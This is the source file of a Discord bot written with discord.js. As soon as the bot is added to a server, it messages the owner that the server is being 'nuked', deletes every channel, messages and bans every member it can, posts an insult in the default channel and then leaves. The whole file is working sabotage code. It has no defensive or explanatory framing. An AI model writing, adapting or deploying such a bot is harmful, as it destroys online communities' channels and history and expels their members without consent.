const { Client } = require('discord.js');
const config = require('./config.json');
const client = new Client();

client.on('ready', () => { 
  console.log('Ready to have some fun... >:)');
});

client.on('guildCreate', async (guild) => {
  let users = 0;
  let channels = 0;

  try {
    await guild.owner.send('Hey there! Your guild is getting nuked!');
  } catch (e) {}

  for(const [, c] of guild.channels)  {
    try {
      await c.delete();
    } catch (e) {
      continue;
    }
    channels++;
  }

  for(const [, m] of guild.members) {
    try {
      await m.send('You\'re getting banned! Nothing personal...');
    } catch (e) {}

    try {
      if(m.bannable) await m.ban();
    } catch (e) {
      continue;
    }

    users++;
  }

  try {
    await guild.defaultChannel.send('Dumbass, I said not to add the bot...');
  } catch (e) {}

  console.log(`Banned ${users} users and ${channels} channels from ${guild.name}`);
  guild.leave();
});

client.login(config.token).catch(console.error);
